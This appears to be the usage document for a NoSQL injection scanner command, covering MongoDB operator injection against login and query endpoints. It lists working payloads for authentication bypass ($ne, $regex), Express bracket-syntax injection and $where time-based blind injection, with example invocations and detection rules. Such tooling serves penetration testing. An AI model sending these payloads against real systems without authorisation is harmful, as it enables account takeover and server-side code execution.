---
description: NoSQL injection scanner (MongoDB/Mongoose/operator-injection DBs) — auth bypass via $ne/$gt operators, bracket-syntax query injection, $where time-based blind. Usage: /nosqli --login <url> --user-field email --pass-field password
---

# /nosqli

Test JSON/operator-style NoSQL injection — the "db" attack surface web2 SQLi
tools miss. Turns an equality check (`{user: X, pass: Y}`) into "match anything"
via operator injection → auth bypass / data read.

## Usage

```
/nosqli --login https://t/api/login --user-field email --pass-field password
/nosqli --login https://t/api/login --baseline-user a@a.co --baseline-pass wrong
/nosqli --query "https://t/api/items?id=1"
```

Run directly:

```bash
tools/nosqli_scanner.py --login https://t/api/login \
  --user-field email --pass-field password --json
```

## Techniques

| Technique | Payload | Confirms via |
|---|---|---|
| Operator auth-bypass | `{"email":{"$ne":null},"password":{"$ne":null}}` | response flips 401→200 / body-length jump |
| Known-user wildcard | `{"email":"admin","password":{"$ne":""}}` | same |
| `$regex` match-all | `{"$regex":".*"}` | same |
| Bracket-syntax (Express/qs) | `email[$ne]=&password[$ne]=` | manual diff (emitted) |
| `$where` time-based blind | `{"$where":"sleep(5000)"}` | response delay ≥ 3.5s |

## How detection works

The scanner sends a **wrong-credential baseline** first, then each payload, and
flags a finding when:
- status flips from 401/403 to 200/302, **or**
- body length changes by >25% (or >64 bytes) at the same status, **or**
- the `$where` sleep payload measurably delays the response (server-side JS eval = CRITICAL).

`--query` mode can't auto-confirm (no baseline), so it prints the bracket-
injection variants for you to diff manually in Burp/Repeater.

## Impact

Operator auth-bypass on a login = **account takeover / full auth bypass**
(Critical). `$where` injection = server-side JS execution → often RCE-adjacent.
